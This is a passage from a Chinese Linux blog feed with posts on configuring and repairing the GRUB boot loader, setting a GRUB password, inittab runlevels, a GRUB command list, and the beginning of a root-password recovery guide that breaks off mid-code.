/dev/hda6，也就是(hd0,5)，Linux的根/位于分区/dev/hda7，并且我们cat 出来的/etc/fstab 中/分区的标签为 LABEL=/。下面的两种方法都可以引导；</p><pre><code class="hljs angelscript">grub&gt;kernel (hd0,<span class="hljs-number">5</span>)/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=LABEL=/grub&gt;initrd (hd0,<span class="hljs-number">5</span>)/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.imggrub&gt;boot</code></pre><p>或</p><pre><code class="hljs angelscript">grub&gt;kernel (hd0,<span class="hljs-number">5</span>)/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=/dev/hda7grub&gt;initrd (hd0,<span class="hljs-number">5</span>)/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.imggrub&gt;boot</code></pre><h1 id="六、通过GRUB引导Windows操作系统；"><a href="#六、通过GRUB引导Windows操作系统；" class="headerlink" title="六、通过GRUB引导Windows操作系统；"></a>六、通过GRUB引导Windows操作系统；</h1><h2 id="1、通过编辑-menu-lst-来引导Windows-系统；"><a href="#1、通过编辑-menu-lst-来引导Windows-系统；" class="headerlink" title="1、通过编辑 menu.lst 来引导Windows 系统；"></a>1、通过编辑 menu.lst 来引导Windows 系统；</h2><p>如果您的Windows所处于的分区在(hd0,0)，可以在menu.lst 加如下的一段就能引导起来了；</p><pre><code>title WinXp    rootnoverify (hd0,0)    chainloader +1</code></pre><p>如果您的机器有两块硬盘，而Windows 位于第二个硬盘的第一个分区，也就是(hd1,0)</p><p>您可以用grub的map来指令来操作把两块硬盘的序列对调，这样就不用在BIOS中设置了；在menu.lst中加如下的内容，比如下面的；</p><pre><code class="hljs lisp">title WinXp        map (<span class="hljs-name">hd0</span>) (<span class="hljs-name">hd1</span>)        map (<span class="hljs-name">hd1</span>) (<span class="hljs-name">hd0</span>)        rootnoverify (<span class="hljs-name">hd0</span>,<span class="hljs-number">0</span>)        chainloader <span class="hljs-number">+1</span>  makeactive</code></pre><p>如果Windows的分区不位于硬盘的第一个分区怎么办呢？比如在(hd0,2)；</p><p>这个也好办吧，把rootnoverify 这行的(hd0,0)改为 (hd0,2)</p><pre><code class="hljs properties"><span class="hljs-attr">title</span> <span class="hljs-string">WinXp</span>        <span class="hljs-attr">rootnoverify</span> <span class="hljs-string">(hd0,2)</span>        <span class="hljs-attr">chainloader</span> <span class="hljs-string">+1</span>  <span class="hljs-attr">makeactive</span></code></pre><p>如果Windows的在第二个硬盘的某个分区，比如说是位于(hd1,2)，则要用到map指令；</p><pre><code class="hljs lisp">title WinXp        map (<span class="hljs-name">hd0</span>) (<span class="hljs-name">hd1</span>)        map (<span class="hljs-name">hd1</span>) (<span class="hljs-name">hd0</span>)        rootnoverify (<span class="hljs-name">hd1</span>,<span class="hljs-number">2</span>)        chainloader <span class="hljs-number">+1</span>  makeactive</code></pre><p>如果有多个Windows 系统，怎么才能引导出来呢？应该用hide 和unhide指令操作；比如我们安装了两个Windows ，一个是位于(hd0,0)的windows 98 ，另一个是安装的是位于(hd0,1)的WindowsXP；这时我们就要用到hide指令了；</p><pre><code class="hljs lisp">title Win98         unhide (<span class="hljs-name">hd0</span>,<span class="hljs-number">0</span>)         hide (<span class="hljs-name">hd0</span>,<span class="hljs-number">1</span>)        rootnoverify (<span class="hljs-name">hd0</span>,<span class="hljs-number">0</span>)        chainloader <span class="hljs-number">+1</span>  makeactivetitle WinXP        unhide (<span class="hljs-name">hd0</span>,<span class="hljs-number">1</span>)        hide (<span class="hljs-name">hd0</span>,<span class="hljs-number">0</span>)        rootnoverify (<span class="hljs-name">hd0</span>,<span class="hljs-number">1</span>)        chainloader <span class="hljs-number">+1</span>  makeactive</code></pre><h2 id="2、通过GRUB指令来引导Windows-；"><a href="#2、通过GRUB指令来引导Windows-；" class="headerlink" title="2、通过GRUB指令来引导Windows ；"></a>2、通过GRUB指令来引导Windows ；</h2><p>其实我们会写menu.lst了，在menu.lst中的除了title外，都是一条条指令；如果我们启动Windows ，只是输入指令就行了；</p><p>比如 Windows的分区在 (hd0,0)，我们在开机后，按ctrl+c ，进入GRUB的命令模式；就可以用下面的</p><pre><code class="hljs shell"><span class="hljs-meta">grub&gt;</span><span class="bash"> rootnoverify (hd0,0)</span><span class="hljs-meta">grub&gt;</span><span class="bash"> chainloader +1</span><span class="hljs-meta">grub&gt;</span><span class="bash"> boot</span></code></pre><p>其它同理… …</p><h1 id="七、GRUB丢失或损坏的应对策略；"><a href="#七、GRUB丢失或损坏的应对策略；" class="headerlink" title="七、GRUB丢失或损坏的应对策略；"></a>七、GRUB丢失或损坏的应对策略；</h1><p>如果GRUB是Linux版本才出会这样的问题；WINGRUB可以不写在MBR上；所以不会出现这样的问题。WINGRUB用起来比较简单。menu.lst 和命令行的用法和Linux版本的GRUB是一样的；</p><h2 id="1、由于重新安装Windows或其它未知原因而导致GRUB的丢失；"><a href="#1、由于重新安装Windows或其它未知原因而导致GRUB的丢失；" class="headerlink" title="1、由于重新安装Windows或其它未知原因而导致GRUB的丢失；"></a>1、由于重新安装Windows或其它未知原因而导致GRUB的丢失；</h2><p>您可以通过系统安装盘、livecd进入修复模式；</p><p>请参考：《Linux 系统的单用户模式、修复模式、跨控制台登录在系统修复中的运用》</p><p>首先：您根据前面所说grub-install来安装GRUB到/boot所在的分区；要仔细看文档，/boot是不是处于一个独立的分区是重要的，执行的命令也不同；</p><p>其次：要执行grub ，然后通过 root (hd[0-n],y)来指定/boot所位于的分区，然后接着执行 setup (hd0)，这样就写入MBR了，比如下面的例子；</p><pre><code class="hljs lisp">grub&gt;root (<span class="hljs-name">hd0</span>,<span class="hljs-number">6</span>)grub&gt;setup (<span class="hljs-name">hd0</span>)grub&gt;quit</code></pre><p>重新引导就会再次出现MBR的菜单了或命令行的提示符了；</p><h2 id="2、如果出现GRUB提示符，而不出现GRUB的菜单，如何引导系统；"><a href="#2、如果出现GRUB提示符，而不出现GRUB的菜单，如何引导系统；" class="headerlink" title="2、如果出现GRUB提示符，而不出现GRUB的菜单，如何引导系统；"></a>2、如果出现GRUB提示符，而不出现GRUB的菜单，如何引导系统；</h2><p>存在的问题可能是/boot/grub/menu.lst丢失，要自己写一个才行；您可以用命令行来启动系统，进入系统后写一写menu.lst就OK了。前面已经谈过了；</p><p>写好后还要建一个grub.conf的链接，如下：</p><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># cd /boot/grub</span>[root<span class="hljs-symbol">@localhost</span> grub]<span class="hljs-meta"># ln -s menu.lst grub.conf</span></code></pre><h1 id="八、关于GRUB的未尽事宜；"><a href="#八、关于GRUB的未尽事宜；" class="headerlink" title="八、关于GRUB的未尽事宜；"></a>八、关于GRUB的未尽事宜；</h1><p>GRUB有很多内容，比如对BSD的引导，还有一些其它指令的用法，我并没有在本文提到；主要我目前还未用到，如果您需要了解更多，请查看 《GNU GRUB 手册和FAQ》</p><h1 id="九、关于本文；"><a href="#九、关于本文；" class="headerlink" title="九、关于本文；"></a>九、关于本文；</h1><p>本文前后写了三四天，中间发现并不能把Linux设备的两种表现形式说的清楚，于是被迫写了《在Linux系统中存储设备的两种表示方法》；由于没有BSD系统，所以没有写关于BSD的引导；如果正在用BSD的弟兄如果有时间不妨写一写；写的时候注意文档的结构，这样方便大家的阅读；</p><p>GRUB有很多内容，需要大家慢慢的学习和研究；有的弟兄抑制GRUB，说不如NTLOADER，其实这是错误的；如果您想学习和使用Linux就得学习和适应Linux的操作；习惯成自然，如果您抵制学习Linux，那可能您永远会说“Linux不如Windows”；</p><h1 id="十、参考文档；"><a href="#十、参考文档；" class="headerlink" title="十、参考文档；"></a>十、参考文档；</h1><p>《GNU GRUB 手册和FAQ》</p><h1 id="注-以上文档为本人整理资料时发现的文章-但是文章的出处已经无从查证-对书写此文章的前辈致敬"><a href="#注-以上文档为本人整理资料时发现的文章-但是文章的出处已经无从查证-对书写此文章的前辈致敬" class="headerlink" title="注:以上文档为本人整理资料时发现的文章,但是文章的出处已经无从查证,对书写此文章的前辈致敬"></a>注:以上文档为本人整理资料时发现的文章,但是文章的出处已经无从查证,对书写此文章的前辈致敬</h1>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
      <category>os</category>
      
    </categories>
    
    
    <tags>
      
      <tag>grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何为GRUP系统引导管理器添加密码</title>
    <link href="/2018/05/15/2018-05-15-add-grub-password/"/>
    <url>/2018/05/15/2018-05-15-add-grub-password/</url>
    
    <content type="html"><![CDATA[<p>如何为GRUB系统引导管理器加上密码<br>摘要：本文主要是讲述就如何为GRUB系统引导管理器加上密码，只要输入密码才能使用GRUB来引导系统；仅限于桌面系统上的应用，不能用 于远程管理的服务器上；我们总不会为了系统安全，重启服务器后，要跑到机房输入GRUB的密码吧；GRUB有两种加密方法，一种是明口令，另一种是md5 口令加密；</p><hr><h2 id="一、GRUB-明口令加密；"><a href="#一、GRUB-明口令加密；" class="headerlink" title="一、GRUB 明口令加密；"></a>一、GRUB 明口令加密；</h2><p>比如我没有设置密码之前/etc/grub是如下的样子：</p><pre><code class="hljs lsl"><span class="hljs-section">default</span>=<span class="hljs-number">1</span>timeout=<span class="hljs-number">10</span>splashimage=(hd0,<span class="hljs-number">7</span>)/boot/grub/splash.xpm.gztitle Fedora Core (<span class="hljs-number">2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl)root (hd0,<span class="hljs-number">7</span>)kernel /boot/vmlinuz<span class="hljs-number">-2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl ro root=LABEL=/initrd /boot/initrd<span class="hljs-number">-2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl.imgtitle WindowsXProotnoverify (hd0,<span class="hljs-number">0</span>)chainloader +<span class="hljs-number">1</span></code></pre><p>加入以后就是下面这样的：</p><pre><code class="hljs lsl"><span class="hljs-section">default</span>=<span class="hljs-number">1</span>timeout=<span class="hljs-number">10</span>splashimage=(hd0,<span class="hljs-number">7</span>)/boot/grub/splash.xpm.gzpassword=<span class="hljs-number">123456</span>title Fedora Core (<span class="hljs-number">2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl)lockroot (hd0,<span class="hljs-number">7</span>)kernel /boot/vmlinuz<span class="hljs-number">-2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl ro root=LABEL=/initrd /boot/initrd<span class="hljs-number">-2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl.imgtitle WindowsXProotnoverify (hd0,<span class="hljs-number">0</span>)chainloader +<span class="hljs-number">1</span></code></pre><p>从上面的可以看出，GRUB的密码是123456，lock的意思就是把Redhat Fedora锁住了。如果启动时会提示错误。这时就应该按P键，然后输入密码就行了。我设置的是123456，当然应该输入123456了，输入别的密码肯定不能通过，这样是不是做到保密了呢？？</p><h2 id="二、GRUB-的md5加密方法；"><a href="#二、GRUB-的md5加密方法；" class="headerlink" title="二、GRUB 的md5加密方法；"></a>二、GRUB 的md5加密方法；</h2><p>经jerboa兄指教，我又读了一下GRUB文档，的确感觉到用md5加密校验GRUB密码比较安全。为了也能让和我一样菜的弟兄，也能知道如何通过md5进行GRUB密码加密，我不得不把这个教程写出来。哈哈，高手就是免读了，此文为菜鸟弟兄所准备。<br>用md5加密校码GRUB密码，这样会更安全。</p><h2 id="1、用grub-md5-crypt成生GRUB的md5密码；"><a href="#1、用grub-md5-crypt成生GRUB的md5密码；" class="headerlink" title="1、用grub-md5-crypt成生GRUB的md5密码；"></a>1、用grub-md5-crypt成生GRUB的md5密码；</h2><p>通过grub-md5-crypt对GRUB的密码进行加密码运算，比如我们想设置grub的密码是123456，所以我们先要用md5进行对123456这个密码进行加密</p><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>linux01 beinan]# /sbin/grub-md5-cryptPassword: 在这里输入<span class="hljs-number">123456</span>Retype password: 再输入一次<span class="hljs-number">123456</span>$<span class="hljs-number">1</span>$<span class="hljs-number">7</span>uDL20$eSB.XRPG2A2Fv8AeH34nZ0</code></pre><p>$1$7uDL20$eSB.XRPG2A2Fv8AeH34nZ0 就是通过grub-md5-crypt进行加密码后产生的值。这个值我们要记下来，还是有点用。</p><h2 id="2、更改-etc-grub-conf"><a href="#2、更改-etc-grub-conf" class="headerlink" title="2、更改 /etc/grub.conf"></a>2、更改 /etc/grub.conf</h2><p>比如我原来的/etc/grub.conf文件的内容是下面的。</p><pre><code class="hljs lsl"><span class="hljs-section">default</span>=<span class="hljs-number">1</span>timeout=<span class="hljs-number">10</span>splashimage=(hd0,<span class="hljs-number">7</span>)/boot/grub/splash.xpm.gztitle Fedora Core (<span class="hljs-number">2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl)root (hd0,<span class="hljs-number">7</span>)kernel /boot/vmlinuz<span class="hljs-number">-2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl ro root=LABEL=/initrd /boot/initrd<span class="hljs-number">-2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl.imgtitle WindowsXProotnoverify (hd0,<span class="hljs-number">0</span>)chainloader +<span class="hljs-number">1</span></code></pre><p>所以我要在/etc/grub.conf中加入 password –md5 $1$7uDL20$eSB.XRPG2A2Fv8AeH34nZ0 这行，以及lock，应该加到哪呢，请看下面的更改实例；</p><pre><code class="hljs angelscript">timeout=<span class="hljs-number">10</span>splashimage=(hd0,<span class="hljs-number">7</span>)/boot/grub/splash.xpm.gzpassword --md5 $<span class="hljs-number">1</span>$<span class="hljs-number">7</span>uDL20$eSB.XRPG2A2Fv8AeH34nZ0title Fedora Core (<span class="hljs-number">2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl)lockroot (hd0,<span class="hljs-number">7</span>)kernel /boot/vmlinuz<span class="hljs-number">-2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl ro root=LABEL=/initrd /boot/initrd<span class="hljs-number">-2.4</span><span class="hljs-number">.22</span><span class="hljs-number">-1.2061</span>.nptl.imgtitle WindowsXProotnoverify (hd0,<span class="hljs-number">0</span>)chainloader +<span class="hljs-number">1</span></code></pre><p>我们仔细看一下，从上面的我们改过的/etc/grub.conf中是不是已经用到了我们在第一步通过/grub-md5-crypt所产生的密码呢？？是不是有点安全感了？？</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>os</category>
      
    </categories>
    
    
    <tags>
      
      <tag>grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>init进程</title>
    <link href="/2018/05/15/2018-05-15-linux-init/"/>
    <url>/2018/05/15/2018-05-15-linux-init/</url>
    
    <content type="html"><![CDATA[<h1 id="init进程"><a href="#init进程" class="headerlink" title="init进程"></a>init进程</h1><p>init的进程号为1,是所有进程的父进程，内核初始化完毕之后，init程序开始运行。其他软件也同时开始运行。init程序通过/etc/inittab文件进行配置。inittab文件的内容如下：<br>引用内容：</p><pre><code># inittab       This file describes how the INIT process should set up#               the system in a certain run-level.## Author:       Miquel van Smoorenburg, &lt;miquels@drinkel.nl.mugnet.org&gt;#               Modified for RHS Linux by Marc Ewing and Donnie Barnes## Default runlevel. The runlevels used by RHS are:#   0 - halt (Do NOT set initdefault to this)#   1 - Single user mode#   2 - Multiuser, without NFS (The same as 3, if you do not have networking)#   3 - Full multiuser mode#   4 - unused#   5 - X11#   6 - reboot (Do NOT set initdefault to this)#    id:3:initdefault:# System initialization.si::sysinit:/etc/rc.d/rc.sysinitl0:0:wait:/etc/rc.d/rc 0l1:1:wait:/etc/rc.d/rc 1l2:2:wait:/etc/rc.d/rc 2l3:3:wait:/etc/rc.d/rc 3l4:4:wait:/etc/rc.d/rc 4l5:5:wait:/etc/rc.d/rc 5l6:6:wait:/etc/rc.d/rc 6# Things to run in every runlevelud::once:/sbin/update# Trap CTRL-ALT-DELETEca::ctrlaltdel:/sbin/shutdown -t3 -r now# When our UPS tells us power has failed, assume we have a few minutes# of power left.  Schedule a shutdown for 2 minutes from now.# This does, of course, assume you have powerd installed and your# UPS connected and working correctly.pf::powerfail:/sbin/shutdown -f -h +2 &quot;Power Failure; System Shutting Down&quot;# If power was restored before the shutdown kicked in, cancel it.pr:12345:powerokwait:/sbin/shutdown -c &quot;Power Restored; Shutdown Cancelled&quot;# If power was restored before the shutdown kicked in, cancel it.pr:12345:powerokwait:/sbin/shutdown -c &quot;Power Restored; Shutdown Cancelled&quot;# Run gettys in standard runlevels1:2345:respawn:/sbin/mingetty tty12:2345:respawn:/sbin/mingetty tty23:2345:respawn:/sbin/mingetty tty34:2345:respawn:/sbin/mingetty tty45:2345:respawn:/sbin/mingetty tty56:2345:respawn:/sbin/mingetty tty6                                                                                                                             # Run xdm in runlevel 5x:5:respawn:/etc/X11/prefdm -nodaemon</code></pre><p>Runlevel 0是让init关闭所有进程并终止系统。</p><p>Runlevel 1是用来将系统转到单用户模式，单用户模式只能有系统管理员进入，在该模式下处理那些在有登录用户的情况下不能进行更改的文件，改runlevel的编号1也可以用S代替。</p><p>Runlevel 2是允许系统进入多用户的模式，但并不支持文件共享，这种模式很少应用。</p><p>Runlevel 3是最常用的运行模式，主要用来提供真正的多用户模式，也是多数服务器的缺省模式。</p><p>Runlevel 4一般不被系统使用，用户可以设计自己的系统状态并将其应用到runlevel 4阶段，尽管很少使用，但使用该系统可以实现一些特定的登录请求。</p><p>Runlevel 5是将系统初始化为专用的X Window终端。对功能强大的Linux系统来说，这并不是好的选择，但用户如果需要这样，也可以通过在runlevel启动来实现该方案。</p><p>Runlevel 6是关闭所有运行的进程并重新启动系统。</p><p>在inittab文件中以#开头的所有行都是注释行。注释行有助于用户理解inittab文件，inittab文件中的值都是如下格式：</p><pre><code>label:runlevel:action:process</code></pre><p>label是1~4个字符的标签，用来标示输入的值。一些系统只支持2个字符的标签。鉴于此原因，多数人都将标签字符的个数限制在2个以内。该标签可以是任意字符构成的字符串，但实际上，某些特定的标签是常用的，在Red Hat Linux中使用的标签是：<br>代码:</p><pre><code>id 用来定义缺省的init运行的级别si 是系统初始化的进程ln 其中的n从1~6,指明该进程可以使用的runlevel的级别ud 是升级进程ca 指明当按下Ctrl+Alt+Del是运行的进程pf 指当UPS表明断电时运行的进程pr 是在系统真正关闭之前，UPS发出电源恢复的信号时需要运行的进程x  是将系统转入X终端时需要运行的进程</code></pre><p>runlevel字段指定runlevel的级别。可以指定多个runlevel级别，也可以不为runlevel字段指定特定的值。</p><p>action字段定义了该进程应该运行在何种状态下：<br>代码:</p><pre><code>boot        在系统启动时运行，忽略runlevelbootwait    在系统启动时运行，init等待进程完成。忽略runlevelctrlaltdel    当Ctrl+Alt+Del三个键同时按下时运行，把SIGINT信号发送给init。忽略    runlevelinitdefault    不要执行这个进程，它用于设置默认runlevelkbrequest    当init从键盘中收到信号时运行。这里要求键盘组合符合KeyBoardSigral(参见/usr/share/doc/kbd-*关于键盘组合的文档)off        禁止进入，因此该进程不运行once        每一个runlevel级别运行一次ondemand    当系统指定特定的运行级别A、B、C时运行powerfail    当init收到SIGPWR信号时运行powerokwait    当收到SIGPWD信号且/etc/文件中的电源状态包含OK时运行powerwait    当收到SIGPWD信号，并且init等待进程结束时运行respawn        不管何时终止都重新启动进程sysinit        在运行boot或bootwait进程之前运行wait        运行进程等待输入运行模式process 字段包含init执行的进程，该进程采用的格式与在命令行下运行该进程的格式一样，因此process字段都以该进程的名字开头，紧跟着是运行时，紧跟着是运行时要传递给该进程的参数。比如/sbin/shutdown -t3 -r now，该进程在按下Ctrl+Alt+Del时执行，在命令行下也可以直接输入来重新启动系统。</code></pre><p>特殊目的的记录<br>    仔细学习例子文件，学习应用其中关于inittab的语法格式。该文件的大多数内容都可以忽略，因为超过一半的内容都是注释，剩余的一些文件内容主要是用来实现某些特殊的功能：</p><pre><code>id 的值表明缺省的runlevel是3。ud 的值可以唤醒/sbin/update进程，该进程为保持磁盘的完整性，将在对磁盘进行I/O操作之前清空整个I/O缓冲区。pf、pr和ca的值只被特定的中断所调用。</code></pre><p>如果系统是专用的X终端，则只需x的输入值。<br>getty进程来提供虚拟终端设备的服务，例如：</p><pre><code>3:2345:respawn:/sbin/mingetty tty3</code></pre><p>标签字段的值是3,3是设备tty3的数字后缀,tty3与相应的进程相关联，该getty进程可以启动的runlevel是2、3、4和5,当该进程终止时，init马上就重新启动它。启动进程的路径名是/sbin/mingetty，该进程是实现虚拟终端支持的最小版本的getty，为tty3提供启动虚拟设备的进程。</p><pre><code>si::sysinit:/etc/rc.d/rc.sysinit</code></pre><p>该值告诉init程序运行/etc /rc.d/rc.sysinit脚本文件来初始化系统，该脚本文件与所有启动的脚本类似，它只是一个包含Linux的 shell命令的可执行文件，注意输入的字符串必须包括该脚本的完整路径。不同版本的Linux存放该脚本的位置也不相同，但不用刻意去记忆这些位置，只需查看/etc/inittab 文件即可，该文件中包含启动脚本文件的确切位置。</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>grub命令</title>
    <link href="/2018/05/15/2018-05-15-grub-command/"/>
    <url>/2018/05/15/2018-05-15-grub-command/</url>
    
    <content type="html"><![CDATA[<h2 id="grub命令"><a href="#grub命令" class="headerlink" title="grub命令"></a>grub命令</h2><h2 id="一、菜单命令"><a href="#一、菜单命令" class="headerlink" title="一、菜单命令"></a>一、菜单命令</h2><p>菜单命令只能用于grub配置文件的全局配置部分，不能用在grub命令行交互界面，菜单命令在配置文件中应放在其它命令之前。</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span><span class="hljs-keyword">default</span> <span class="hljs-comment">//设置默认启动的菜单项</span><span class="hljs-number">2.f</span>allback <span class="hljs-comment">//设置启动某菜单项失败后反回的菜单项</span><span class="hljs-number">3.</span>hiddenmenu <span class="hljs-comment">//隐藏菜单界面</span><span class="hljs-number">4.</span>timeout <span class="hljs-comment">//设置菜单自动启动的延时时间</span><span class="hljs-number">5.</span>title <span class="hljs-comment">//开始一个菜单项</span></code></pre><h2 id="二、常规命令"><a href="#二、常规命令" class="headerlink" title="二、常规命令"></a>二、常规命令</h2><p>常规命令可以应该于配置文件和grub命令行交互界面，可使用的常规命令有</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>bootp <span class="hljs-comment">//通过bootp初始化网络设备</span><span class="hljs-number">2.</span>color <span class="hljs-comment">//设置菜单界面的颜色</span><span class="hljs-number">3.</span>device <span class="hljs-comment">//指定设备文件作为驱动器</span><span class="hljs-number">4.</span>dhcp <span class="hljs-comment">//通过DHCP初始化网络设备</span><span class="hljs-number">5.</span>hide <span class="hljs-comment">//隐藏某分区</span><span class="hljs-number">6.</span>ifconfig <span class="hljs-comment">//手工配置网络设备</span><span class="hljs-number">7.</span>pager <span class="hljs-comment">//改变内部页程序的状态</span><span class="hljs-number">8.</span>partnew <span class="hljs-comment">//新建一个主分区</span><span class="hljs-number">9.</span>parttype <span class="hljs-comment">//改变分区的类型</span><span class="hljs-number">10.</span>password 为菜单界面设置口令<span class="hljs-number">11.</span>rarp <span class="hljs-comment">//通过RARP初始化网络设置</span><span class="hljs-number">12.</span>serial <span class="hljs-comment">//设置串口设备</span><span class="hljs-number">13.</span>setkey <span class="hljs-comment">//设置键盘映射</span><span class="hljs-number">14.</span>splashimage <span class="hljs-comment">//设置GRUB启动时的背景图片文件</span><span class="hljs-number">15.</span>termainal <span class="hljs-comment">//选择终端类型</span><span class="hljs-number">16.</span>tftpserver <span class="hljs-comment">//指定TFTP服务器</span><span class="hljs-number">17.</span>unhide <span class="hljs-comment">//还原某隐藏分区</span></code></pre><h2 id="三、命令行和菜单项命令"><a href="#三、命令行和菜单项命令" class="headerlink" title="三、命令行和菜单项命令"></a>三、命令行和菜单项命令</h2><p>命令行和菜单项命令可应该于GRUB配置文件的菜单项设置中，也可以用在GRUB命令交互界面。</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>bolcklist <span class="hljs-comment">//显示某文件所在分区位置（block list notation）</span><span class="hljs-number">2.</span>boot <span class="hljs-comment">//启动操作系统</span><span class="hljs-number">3.</span>cat <span class="hljs-comment">//显示文件内容</span><span class="hljs-number">4.</span>chainloader <span class="hljs-comment">//把启动控制权软交给另外的启动引导器</span><span class="hljs-number">5.</span>cmp <span class="hljs-comment">//比较两个文件</span><span class="hljs-number">6.</span>configfile <span class="hljs-comment">//加载已存在的GRUB配置文件</span><span class="hljs-number">7.</span>debug <span class="hljs-comment">//设置为debug模式</span><span class="hljs-number">8.</span>displayapm <span class="hljs-comment">//显示APM BIOS信息</span><span class="hljs-number">9.</span>displaymem <span class="hljs-comment">//显示内存配置</span><span class="hljs-number">10.</span>embed <span class="hljs-comment">//嵌入Stage 1.5文件</span><span class="hljs-number">11.f</span>ind <span class="hljs-comment">//查找包括某文件的所有设备</span><span class="hljs-number">12.f</span>stest <span class="hljs-comment">//测试文件系统</span><span class="hljs-number">13.</span>geometry <span class="hljs-comment">//显示某驱动器的物理信息</span><span class="hljs-number">14.</span>halt <span class="hljs-comment">//停止计算机运行（软件关机）</span><span class="hljs-number">15.</span>help <span class="hljs-comment">//显示GRUB的命令帮助信息</span><span class="hljs-number">16.</span>impsprobe <span class="hljs-comment">//查询对称多处理器（SMP）的信息</span><span class="hljs-number">17.</span>initrd <span class="hljs-comment">//加载initrd文件</span><span class="hljs-number">18.</span>install <span class="hljs-comment">//安装GRUB</span><span class="hljs-number">19.</span>ioprobe <span class="hljs-comment">//查询某驱动器的输入输出（I/O）端口</span><span class="hljs-number">20.</span>kernel <span class="hljs-comment">//引导操作系统内核</span><span class="hljs-number">21.</span>lock <span class="hljs-comment">//锁定某GRUB导菜单项，使其输入密码后才可启动</span><span class="hljs-number">22.</span>makeactive <span class="hljs-comment">//激活某主分区</span><span class="hljs-number">23.</span>map <span class="hljs-comment">//虚拟映射某驱动器</span><span class="hljs-number">24.</span>md5crypt <span class="hljs-comment">//使用MD5加密口令</span><span class="hljs-number">25.</span>module <span class="hljs-comment">//加载模块</span><span class="hljs-number">26.</span>modulenounzip <span class="hljs-comment">//加载模块不进行解压</span><span class="hljs-number">27.</span>pause <span class="hljs-comment">//暂停并等待按键</span><span class="hljs-number">28.</span>quit <span class="hljs-comment">//退出GRUB</span><span class="hljs-number">29.</span>reboot <span class="hljs-comment">//重新启动计算机</span><span class="hljs-number">30.</span>read <span class="hljs-comment">//读取内存中的内容</span><span class="hljs-number">31.</span>root <span class="hljs-comment">//设置GRUB的root设备</span><span class="hljs-number">32.</span>rootnoverify <span class="hljs-comment">//设备GRUB的root设备但不装载文件系统</span><span class="hljs-number">33.</span>savedefault <span class="hljs-comment">//保存当前的启动菜单项为默认启动</span><span class="hljs-number">34.</span>setup <span class="hljs-comment">//自动安装GRUB</span><span class="hljs-number">35.</span>testload <span class="hljs-comment">//从文件系统中测试读取某文件</span><span class="hljs-number">36.</span>testvbe <span class="hljs-comment">//测试VESA BIOS EXTENSION</span><span class="hljs-number">37.</span>uppermem <span class="hljs-comment">//强制设置主机上位内存的大小</span><span class="hljs-number">38.</span>vbeprobe <span class="hljs-comment">//查询VESA BIOS EXTENSION信息</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
      <category>os</category>
      
    </categories>
    
    
    <tags>
      
      <tag>grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux root密码丢失解决方法</title>
    <link href="/2018/05/15/2018-05-15-find-lost-root-password/"/>
    <url>/2018/05/15/2018-05-15-find-lost-root-password/</url>
    
    <content type="html"><![CDATA[<p>Linux root密码丢失的解决办法</p><h2 id="和UNIX系统相同，Linux超级用户root拥有系统的最高权限。当由于用户的疏忽，遗忘了root-密码，或者系统受到黑客的入侵，无法用root-账号登录系统时，可以通过下列办法来恢复root-的密码。"><a href="#和UNIX系统相同，Linux超级用户root拥有系统的最高权限。当由于用户的疏忽，遗忘了root-密码，或者系统受到黑客的入侵，无法用root-账号登录系统时，可以通过下列办法来恢复root-的密码。" class="headerlink" title="和UNIX系统相同，Linux超级用户root拥有系统的最高权限。当由于用户的疏忽，遗忘了root 密码，或者系统受到黑客的入侵，无法用root 账号登录系统时，可以通过下列办法来恢复root 的密码。"></a>和UNIX系统相同，Linux超级用户root拥有系统的最高权限。当由于用户的疏忽，遗忘了root 密码，或者系统受到黑客的入侵，无法用root 账号登录系统时，可以通过下列办法来恢复root 的密码。</h2><h2 id="一、进入单用户模式"><a href="#一、进入单用户模式" class="headerlink" title="一、进入单用户模式"></a>一、进入单用户模式</h2><h3 id="1-使用Linux-系统启动软盘"><a href="#1-使用Linux-系统启动软盘" class="headerlink" title="1.使用Linux 系统启动软盘"></a>1.使用Linux 系统启动软盘</h3><p>如果你已创建了Linux 系统的启动软盘，而且设置计算机系统从软盘启动，当显示boot 提示符后输入：</p><pre><code>boot: linux single</code></pre><p>系统进入了提示符为“#”的单用户模式，计算机引导的运行级别为1，本地文件系统被挂载，很多系统服务没有运行，跳过所有系统认证，是一个系统管理员使用特定的机器，把 root 文件系统挂为读写，此时可以使用：</p><p>(1)passwd 程序来设置root的新密码</p><pre><code class="hljs vala"><span class="hljs-meta"># passwd root</span><span class="hljs-meta"># reboot</span></code></pre><p>重启系统后，root 密码已被更新。</p><p>(2)通过修改 /etc/shadow 文件，删除root 的密码</p><pre><code 